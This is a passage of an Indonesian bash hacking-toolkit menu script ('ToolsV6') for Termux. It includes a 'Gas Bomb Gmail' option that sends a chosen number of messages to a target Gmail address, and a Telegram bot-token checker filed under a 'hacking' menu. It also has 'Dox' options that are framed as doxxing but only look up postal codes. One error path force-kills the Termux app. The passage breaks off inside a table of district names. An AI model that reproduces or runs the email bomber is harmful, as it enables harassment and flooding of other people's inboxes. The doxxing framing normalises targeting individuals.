      ⡇⠆⡘⢿⣿⣿⡿⢈⢻⣿⣿⣿⠇⣤⡏⡄⢿⣿⣿⣿⢃⠘⣿⣿⣿⡟⠐⡌⣿
      ⠃⢠⣆⠌⢿⣿⠇⣻⢊⢻⣿⡟⢨⢺⡷⢸⠈⣿⣿⢂⢰⡄⣿⣿⠏⣐⣴⠠⢹
      ⠘⡘⣿⣹⢸⣿⣀⢻⡞⣨⣿⣶⢀⣣⣥⣇⢲⣿⣧⡘⡮⢃⣸⣧⢸⡼⡟⡠⢸
      ⣧⠈⣦⢻⠸⣿⣿⠈⣧⢈⠻⠏⣼⣻⢟⣿⡌⠿⢋⢠⢡⢸⣿⡿⢸⢣⡞⢀⣿
      ⣿⡄⠺⣼⣇⠙⣣⣺⣿⡷⢉⡜⠛⠛⠚⠛⠛⣄⠱⣿⣎⢤⡛⢃⣾⡵⠂⣸⣿
      ⣿⣧⠐⣽⣿⣷⣦⣭⢥⣶⣿⣿⣿⣿⠀⣿⣿⣿⣳⣦⡭⣭⣴⣿⣿⠽⠀⣿⣿
      ⣿⣿⠀⠛⣻⡭⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣷⣎⣶⡮⣽⡋⠃⢀⣿⣿
      ⣿⣿⠀⢸⣽⣴⣽⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⣿⣿⣿⣿⣿⣝⣽⣿⠀⢸⣿⣿
      ⡿⠟⠀⢀⣀⠀⠀⢀⣀⠀⣀⡀⠀⣀⠀⠀⠀⣀⠀⠀⠀⠀⣀⣀⠀⠀⢘⢿⣿
      ⣷⣤⡄⢘⣿⠇⣠⡿⠋⠀⣿⡇⠀⣿⣧⡀⠀⣿⠀⢠⣾⠛⠉⠋⠁⠀⣤⣄⣿
      ⣿⣿⡇⢨⣿⡿⣿⢄⠀⠀⣿⠆⠀⡇⠹⣷⡄⣿⠀⣿⡇⠀⠀⢠⣤⠀⣿⣿⣿
      ⣿⣿⡇⢸⣿⡅⠘⢿⣦⠀⣿⡇⠀⣷⠀⠈⢿⣿⠀⠹⣷⣄⣀⣸⣿⠀⣿⣿⣿
      ⣿⣿⣧⣈⣟⣇⣀⣨⣉⣅⣭⣃⣤⣭⣄⣤⣤⣩⣥⣤⣤⣭⣭⣭⣭⣤⣿⣿⣟
""")
print(f"{b}Gmail Pengirim{r} : {g}{pengirim}")
print(f"{b}Gmail Tujuan{r} : {g}{penerima}")
print(f"{b}Pesan Terkirim{r} : {g}{sukses}")
print(f"{b}Pesan Gagal{r} : {g}{gagal}")
print(f"{b}Durasi Waktu{r} : {g}{durasi} detik")
EOF
}
reset_config() {
    if [ -f "$CONFIG_FILE" ]; then
        rm "$CONFIG_FILE"
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} Sender berhasil di riset..!!"
        echo ""
        sleep 4
        clear 
        exec bash "${BASH_SOURCE[0]}" "$@"
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Tidak ada config yang tersimpan..!!"
        echo ""
        sleep 4 
    fi
}
load_config
    clear
    echo ""
    echo "
⣿⣿⣿⣿⣿⣿⣿⠿⠟⠿⠿⣿⣿⠿⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠿⠟⠛⠛⠁⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠉⠀⠀⠀⠉⠛⢿⣿⣿⣿
⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿
⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣾
⣿⣄⡀⢀⡀⠀⠀⠀⠀⣠⣤⣤⣴⠿⠿⣦⣄⣀⣀⣴⣄⡀⠀⠀⣠⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣶⠶⠟⠋⠈⠉⠀⠀⠀⠀⠉⠉⠉⠁⠉⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣶⣤⣴⣷⣤⣀⣠⣶⣄⣀⣴⣶⣤⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠛⠛⠉⠀⠀⠈⠙⠛⠛⠛⠛⠿⠿⣿⣿⣿⣿⣿
⣿⣿⣿⡏⠀⣤⣶⣶⣾⣿⣿⣿⡇⠀⠀⠘⣿⣿⣿⣿⣶⣶⣦⡄⠈⣿⣿⣿
⣿⣿⣿⣿⣦⣄⣈⣉⠉⠛⠛⠛⠀⠀⠀⠀⠙⠛⠛⠋⢉⣉⣠⣤⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣭⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿
" | lolcat
    echo ""
    echo -e "${r}[${g} 01 ${r}] ${y}Gas Bomb Gmail"
    echo -e "${r}[${g} 02 ${r}] ${y}Reset Sender"
    echo -e "${r}[${g} 03 ${r}] ${p}Keluar"
    echo ""
    echo -e -n "${r}[${g} >_< ${r}]${c} Masukkan Pilihan Anda ${n}: ${g}"
    read choice
    echo ""
    case $choice in
        1)
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Gmail Target ${n}: ${y}"
            read penerima
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Isi Pesan ${n}: ${c}"
            read body
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Jumlah Bomb ${n}: ${p}"
            read jumlah
            clear
            echo ""
            kirim_email "$email" "$app_password" "$penerima" "$body" "$jumlah"
            ;;
        2)
            reset_config
            ;;
        3)
            clear
            echo ""
            echo -e "${r} Keluar dari tools..!!"
            echo ""
            ;;
        *)
            clear
            echo ""
            echo -e "${r} Pilihan Anda Tidak Valid..!!"
            echo -e "${g}"
            read -p "Tekan Enter untuk melanjutkanya..!!"
            ;;
       esac
        ;;
 4|04)
      clear
      ;;
    *)
  ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "40" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
b='\033[34;1m'
woi() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
mek() {
woi "
██████╗  ██████╗ ████████╗███████╗
██╔══██╗██╔═══██╗╚══██╔══╝╚══███╔╝
██████╔╝██║   ██║   ██║     ███╔╝ 
██╔══██╗██║   ██║   ██║    ███╔╝  
██████╔╝╚██████╔╝   ██║   ███████╗
╚═════╝  ╚═════╝    ╚═╝   ╚══════╝
" | lolcat
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Dork botz"
echo -e "${r}[${y} 02 ${r}] ${g}Dork pemilik"
echo -e "${r}[${y} 00 ${r}] ${c}Keluar"
}
get_bot() {
clear
echo -e "${g}"
figlet Cek-Botz
echo "Development : By.Thxyzz404" | lolcat
echo -e "${c}"
read -p "Masukkan Botz Token : " TOKEN
echo -e "${c}"
clear
figlet Hasil Info
echo "Development : By.Thxyzz404" | lolcat
echo ""
RESPONSE=$(curl -s "https://api.telegram.org/bot$TOKEN/getMe")
USERNAME=$(echo "$RESPONSE" | jq -r '.result.username')
BOT_ID=$(echo "$RESPONSE" | jq -r '.result.id')
IS_BOT=$(echo "$RESPONSE" | jq -r '.result.is_bot')
FIRST_NAME=$(echo "$RESPONSE" | jq -r '.result.first_name')
BIO=$(echo "$RESPONSE" | jq -r '.result.bio // "Tidak ada bio"')
LANGUAGE_CODE=$(echo "$RESPONSE" | jq -r '.result.language_code // "Tidak ada bahasa"')
CPU=$(getprop ro.product.cpu.abi)
echo -e "${r}=================================="
if [ -z "$USERNAME" ] || [ "$USERNAME" = "null" ]; then
    echo -e "${y}Username Bot Telegram ${c}: ${r}Botz telah dihapus."
else
    echo -e "${y}Username Botz Telegram ${c}: ${g}@$USERNAME"
    echo -e "${y}ID Botz Telegram ${c}: ${g}$BOT_ID"
    echo -e "${y}Status Botz ${c}: ${g}$( [ "$IS_BOT" = "true" ] && echo "Ya" || echo "Tidak" )"
    echo -e "${y}Nama Botz ${c}: ${g}$FIRST_NAME"
    echo -e "${y}Bio Botz ${c}: ${g}$BIO"
    echo -e "${y}Kode Bahasa ${c}: ${g}$LANGUAGE_CODE"
fi
echo -e "${y}Distro CPU ${c}: ${g}$CPU"
echo -e "${r}=================================="
}
get_info() {
clear
echo -e "${g}"
figlet Cek-User
echo "Development : By.Thxyzz404" | lolcat
echo -e "${c}"
read -p "Masukkan token botz : " ken
while true; do
    echo -e "${y}"
    read -p "Masukkan id botz : " id 
    echo -e "${g}"
    res=$(curl -s "https://api.telegram.org/bot${ken}/getChat?chat_id=${id}")    
    echo "=================================="
    echo "ID : $(echo "$res" | grep -o '"id":[0-9]*' | cut -d':' -f2)"
    echo "Nama Depan : $(echo "$res" | grep -o '"first_name":"[^"]*"' | cut -d'"' -f4)"
    echo "Username : $(echo "$res" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)"
    echo "Tipe : $(echo "$res" | grep -o '"type":"[^"]*"' | cut -d'"' -f4)"
    echo "=================================="
    echo -e "${y}"  
    read -p "Apakah ingin mengecek lagi? y/n : " lag
    [[ "$lag" != "y" ]] && break
done
}
about() {
echo -e "${g} Thanks you by.thxyzz404"
echo ""
}
start() {
    clear
    mek
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) get_bot ;;
        2|02) get_info ;;
        0|00) about ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
start
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "41" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
a="\033[90;1m"
woi() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
mek() {
woi "
░█▀█░█▀█░█▀▀░▀█▀░█▀█░█░░
░█▀▀░█░█░▀▀█░░█░░█▀█░█░░
░▀░░░▀▀▀░▀▀▀░░▀░░▀░▀░▀▀▀ 
" | lolcat
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Dox versi apikey ${a}# Dox pakek apikey "
echo -e "${r}[${y} 02 ${r}] ${g}Dox versi database ${a}# Dox pakek dbs "
echo -e "${r}[${y} 03 ${r}] ${g}Keluar "
}
dox_1() {
name=""
display_name=""
category=""
type=""
lat=""
lon=""
bbox=""
bbox_data=""
code_data() {
pantau_aktivitas
local url="https://nominatim.openstreetmap.org/search?q=${pos}&polygon_geojson=1&format=jsonv2"
local res=$(curl -s --max-time 10 "$url" 2>/dev/null)
if [ $? -ne 0 ] || [ -z "$res" ]; then
   clear 
   echo ""
   echo -e "${r} Terjadi kesalahan."
   echo ""
   return 1
fi
echo "$res"
return 0
}
get_info() {
local data=$1
local count=$(echo "$data" | jq '. | length' 2>/dev/null)
if [ -z "$count" ] || [ "$count" -eq 0 ]; then
   clear 
   echo ""
   echo -e "${y} Informasi tidak di temukan."
   echo ""
   return 1
fi
local found=0
for ((i=0; i<count; i++)); do
display_name=$(echo "$data" | jq -r ".[$i].display_name" 2>/dev/null)
if [[ "$display_name" == *"Indonesia"* ]] || [[ "$display_name" == *"Indo"* ]]; then
found=1
name=$(echo "$data" | jq -r ".[$i].name" 2>/dev/null)
lat=$(echo "$data" | jq -r ".[$i].lat" 2>/dev/null)
lon=$(echo "$data" | jq -r ".[$i].lon" 2>/dev/null)
category=$(echo "$data" | jq -r ".[$i].category" 2>/dev/null)
type=$(echo "$data" | jq -r ".[$i].type" 2>/dev/null)
display_name=$(echo "$data" | jq -r ".[$i].display_name" 2>/dev/null)
bbox=$(echo "$data" | jq -r ".[$i].boundingbox // []" 2>/dev/null)
if [ "$bbox" != "[]" ] && [ "$bbox" != "null" ]; then
bbox_data=$(echo "$data" | jq -r ".[$i].boundingbox | @csv" 2>/dev/null)
fi
echo ""
echo -e "${r}========================================"
echo -e "${g}     INFORMASI KODE POS INDONESIA"
echo -e "${r}========================================"
echo -e "${y}"
echo "Kode Pos : ${name:-N/A}"
echo "Lokasi : ${display_name:-N/A}"
echo "Kategori : ${category:-N/A}"
echo "Tipe : ${type:-N/A}"
echo -e "${c} Google Maps : https://maps.google.com/?q=${lat:-N/A},${lon:-N/A}"
echo ""
echo -e "${r}========================================"
if [ "$bbox" != "[]" ] && [ "$bbox" != "null" ]; then
echo -e "${p}Bounding Box : ${bbox_data:-N/A}"
echo -e "${r}========================================"
fi
break
fi
done
if [ $found -eq 0 ]; then
clear 
echo ""
echo -e "${a} Lokasi tidak di temukan di kode pos !!"
echo ""
return 1
fi
}
if [ $# -eq 0 ]; then
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣾⣾⣾⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⢨⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠐⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠅⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠘⣿⣿⣿⡿⠃⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣤⣶⠞⠊⠀⢀⣠⣴⣴⣶⡄⢻⠟⢡⣶⣶⣤⣄⡀⠈⠉⠺⣦⣤⣀⠀⠀⠀
⢠⣾⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣦⣼⣿⣿⣿⣿⣿⡿⠀⠀⠀⢸⣿⣿⣷⡄⠀
⢹⣿⣿⣿⣷⣄⠀⠀⠀⠉⠛⠻⠻⠿⠿⠿⠿⠟⠟⠟⠛⠉⠀⠀⢀⣠⣿⣿⣿⣿⡏⠀
⠀⠉⠻⢿⣿⣿⣿⣶⣦⣤⣄⣄⣀⣀⢀⢀⣀⣀⣀⣄⣤⣶⣾⣿⣿⣿⡿⠟⠉⠀⠀
⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⠿⠿⡿⡿⡿⡿⡿⢿⠿⠿⠿⠛⠛⠉⠉ " | lolcat 
echo ""
echo -e "${p}    Developer ${r}: ${c}Thxyzz404 "
echo -e "${g}"
read -p "Masukkan kode pos : " cok
if [ -z "$cok" ]; then
clear 
echo ""
echo -e "${y} Kode pos jangan kosong kocak."
echo ""
pkill -9 -f com.termux
fi
pos="$cok"
else
pos="$1"
fi
if [[ ! $pos =~ ^[0-9]{5}$ ]]; then
clear 
echo ""
echo -e "${r}Kode pos hanya boleh berisi 5 digit angka!"
echo ""
fi
data=$(code_data "$pos")
if [ $? -ne 0 ] || [ -z "$data" ] || [ "$data" = "ERROR" ]; then
    clear 
    echo ""
    echo -e "${r} Terjadi kesalahan pada server ! "
    echo ""
fi
if ! echo "$data" | jq . >/dev/null 2>&1; then
    clear 
    echo ""
    echo -e "${r} Respon tidak valid !!"
    echo ""
fi
get_info "$data"
dir="/sdcard/KODE_POS_INFO"
mkdir -p "$dir"
echo -e "${c}"
read -p "Simpan hasil ke file? [y/n] : " sev
echo ""
if [ "$sev" = "y" ] || [ "$sev" = "Y" ]; then
file="${dir}/postal_info_${pos}_$(date +%Y%m%d_%H%M%S).json"
{
echo "{"
echo "  \"kode_pos\": \"${name:-N/A}\","
echo "  \"lokasi\": \"${display_name:-N/A}\","
echo "  \"kategori\": \"${category:-N/A}\","
echo "  \"tipe\": \"${type:-N/A}\","
echo "  \"google_maps\": \"https://maps.google.com/?q=${lat:-N/A},${lon:-N/A}\","
if [ "$bbox" != "[]" ] && [ "$bbox" != "null" ]; then
echo "  \"bounding_box\": [${bbox_data}]"
else
echo "  \"bounding_box\": null"
fi
echo "}"
} > "$file"
echo -e "${r}[ ${g}✓ ${r}]${a} Data disimpan ke file : $file"
echo ""
fi
}
dox_2() {
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⡿⠿⠿⢿⣿⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣴⣿⢟⡛⢍⠒⡰⡈⠥⣉⠒⡌⢛⢽⣟⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⡿⣋⠒⢢⠘⠤⡙⠤⡑⣡⢂⠣⡘⢂⢆⡙⢮⣗⠿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⢋⠲⢠⠙⢢⠉⣆⣵⣶⣷⣿⣿⣷⣷⣧⣆⠜⣠⠻⣏⡷⣻⢿⣧⡀⠀
⠀⣼⣿⡑⢊⠱⠨⡌⣡⣾⠿⠋⠁⠀⠀⠀⠀⠈⠙⠻⣿⣦⠥⡹⣳⡽⣫⣿⣷⠀
⢰⣿⢣⠘⡌⡡⢃⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣷⡡⢻⣵⢻⡼⣿⣇
⣾⡿⢂⡱⢌⠰⣹⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠙⣮⡗⣯⢿⣿
⣿⡇⢣⠰⣈⠒⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠡⣿⡝⣮⢿⣿
⢿⣿⢠⢃⠤⡉⢽⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⢡⡟⣾⡹⣾⣿
⠸⣿⣦⠊⡔⠩⢌⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠣⢹⣾⣱⣻⣿⠇
⠀⠹⣿⣜⢨⠑⠬⣈⠿⣿⣦⣀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⣅⢊⡿⣖⣳⣿⡟⠀
⠀⠀⠹⣿⣦⢉⠖⡠⢎⡘⠹⠿⢿⣷⣶⣶⣶⡿⢿⠛⡅⢣⠰⣸⢷⣹⣿⠟⠀⠀
⠀⠀⠀⠙⣿⣎⢆⡑⠢⢌⡱⢘⢂⡒⠰⢂⡱⢈⠦⡑⠌⢆⢱⣯⣳⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣖⡌⠱⢂⡔⠣⢌⡰⢉⡒⠤⢃⢆⠩⡘⢌⡾⣵⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣎⡑⡊⠔⣡⠒⡄⢣⢘⡐⠣⢌⠒⡩⣸⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣿⣖⢩⠘⡄⢣⠘⡄⠣⢌⠱⡈⢎⢱⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢊⡔⢡⢃⠬⡑⢊⠱⡈⢦⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⢈⠦⡘⠤⡑⡉⠆⢥⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢢⠑⡘⠤⡙⢌⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠩⠜⡰⢁⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠓⡄⣻⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣯⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⠃⠀" | lolcat 
echo ""
echo -e "${g}======================================="
echo -e "${p}    Developer ${r}: ${c}Thxyzz404 & Rullzz "
echo -e "${g}======================================="
echo ""
read -p "$(echo -e "${b}❯❯ ${y}Masukkan kode pos ${r}[ ${g}contoh : 16112 ${r}]${c} : ")" kode_pos
echo ""
if [[ -z "$kode_pos" ]]; then
    clear 
    echo ""
    echo -e "${r} Jangan kosong cok."
    echo ""
fi
echo -e "${r}[ ${g}✓ ${r}]${a} Kode Pos : $kode_pos"
echo ""
bar() {
f=(
    "[\e[1;91m■\e[0m□□□□□□□□□]"
    "[\e[1;92m■■\e[0m□□□□□□□□]"
    "[\e[1;93m■■■\e[0m□□□□□□□]"
    "[\e[1;94m■■■■\e[0m□□□□□□]"
    "[\e[1;95m■■■■■\e[0m□□□□□]"
    "[\e[1;96m■■■■■■\e[0m□□□□]"
    "[\e[1;97m■■■■■■■\e[0m□□□]"
    "[\e[1;92m■■■■■■■■\e[0m□□]"
    "[\e[1;93m■■■■■■■■■\e[0m□]"
    "[\e[1;94m■■■■■■■■■■\e[0m]"
)
while true; do
for fra in "${f[@]}"; do
   printf "\r$fra \033[41;1m\033[1;32m Pencarian... \033[0m "
   sleep 0.12
done
done
}
bar &
BAR_PID=$!
github_url="https://raw.githubusercontent.com/Apwusyvwkjwygw/Database/89235e606b3c03f33d36ba9750fdfb9fdd24b6e4/kodepos.json"
json_data=$(curl -s --max-time 5 "$github_url" 2>/dev/null)
sleep 2
kill $BAR_PID 2>/dev/null
printf "\r\033[K"
declare -A kabupaten_data=(
    ["1101"]="Kab. Aceh Selatan" ["1102"]="Kab. Aceh Tenggara"
    ["1103"]="Kab. Aceh Timur" ["1104"]="Kab. Aceh Tengah"
    ["1105"]="Kab. Aceh Barat" ["1106"]="Kab. Aceh Besar"
    ["1107"]="Kab. Pidie" ["1108"]="Kab. Aceh Utara"
    ["1109"]="Kab. Simeulue" ["1110"]="Kab. Aceh Singkil"
    ["1111"]="Kab. Bireuen" ["1112"]="Kab. Aceh Barat Daya"
    ["1113"]="Kab. Gayo Lues" ["1114"]="Kab. Aceh Jaya"
    ["1115"]="Kab. Nagan Raya" ["1116"]="Kab. Aceh Tamiang"
    ["1117"]="Kab. Bener Meriah" ["1118"]="Kab. Pidie Jaya"
    ["1171"]="Kota Banda Aceh" ["1172"]="Kota Sabang"
    ["1173"]="Kota Lhokseumawe" ["1174"]="Kota Langsa"
    ["1175"]="Kota Subulussalam"
    ["1201"]="Kab. Tapanuli Tengah" ["1202"]="Kab. Tapanuli Utara"
    ["1203"]="Kab. Tapanuli Selatan" ["1204"]="Kab. Nias"
    ["1205"]="Kab. Langkat" ["1206"]="Kab. Karo"
    ["1207"]="Kab. Deli Serdang" ["1208"]="Kab. Simalungun"
    ["1209"]="Kab. Asahan" ["1210"]="Kab. Labuhanbatu"
    ["1211"]="Kab. Dairi" ["1212"]="Kab. Toba Samosir"
    ["1213"]="Kab. Mandailing Natal" ["1214"]="Kab. Nias Selatan"
    ["1215"]="Kab. Pakpak Bharat" ["1216"]="Kab. Humbang Hasundutan"
    ["1217"]="Kab. Samosir" ["1218"]="Kab. Serdang Bedagai"
    ["1219"]="Kab. Batu Bara" ["1220"]="Kab. Padang Lawas Utara"
    ["1221"]="Kab. Padang Lawas" ["1222"]="Kab. Labuhanbatu Selatan"
    ["1223"]="Kab. Labuhanbatu Utara" ["1224"]="Kab. Nias Utara"
    ["1225"]="Kab. Nias Barat"
    ["1271"]="Kota Medan" ["1272"]="Kota Pematangsiantar"
    ["1273"]="Kota Sibolga" ["1274"]="Kota Tanjung Balai"
    ["1275"]="Kota Binjai" ["1276"]="Kota Tebing Tinggi"
    ["1277"]="Kota Padang Sidempuan" ["1278"]="Kota Gunungsitoli"
    ["1301"]="Kab. Pesisir Selatan" ["1302"]="Kab. Solok"
    ["1303"]="Kab. Sijunjung" ["1304"]="Kab. Tanah Datar"
    ["1305"]="Kab. Padang Pariaman" ["1306"]="Kab. Agam"
    ["1307"]="Kab. Lima Puluh Kota" ["1308"]="Kab. Pasaman"
    ["1309"]="Kab. Kepulauan Mentawai" ["1310"]="Kab. Dharmasraya"
    ["1311"]="Kab. Solok Selatan" ["1312"]="Kab. Pasaman Barat"
    ["1371"]="Kota Padang" ["1372"]="Kota Solok"
    ["1373"]="Kota Sawahlunto" ["1374"]="Kota Padang Panjang"
    ["1375"]="Kota Bukittinggi" ["1376"]="Kota Payakumbuh"
    ["1377"]="Kota Pariaman"
    ["1401"]="Kab. Kampar" ["1402"]="Kab. Indragiri Hulu"
    ["1403"]="Kab. Bengkalis" ["1404"]="Kab. Indragiri Hilir"
    ["1405"]="Kab. Pelalawan" ["1406"]="Kab. Rokan Hulu"
    ["1407"]="Kab. Rokan Hilir" ["1408"]="Kab. Siak"
    ["1409"]="Kab. Kuantan Singingi" ["1410"]="Kab. Kepulauan Meranti"
    ["1471"]="Kota Pekanbaru" ["1472"]="Kota Dumai"
    ["1501"]="Kab. Kerinci" ["1502"]="Kab. Merangin"
    ["1503"]="Kab. Sarolangun" ["1504"]="Kab. Batanghari"
    ["1505"]="Kab. Muaro Jambi" ["1506"]="Kab. Tanjung Jabung Barat"
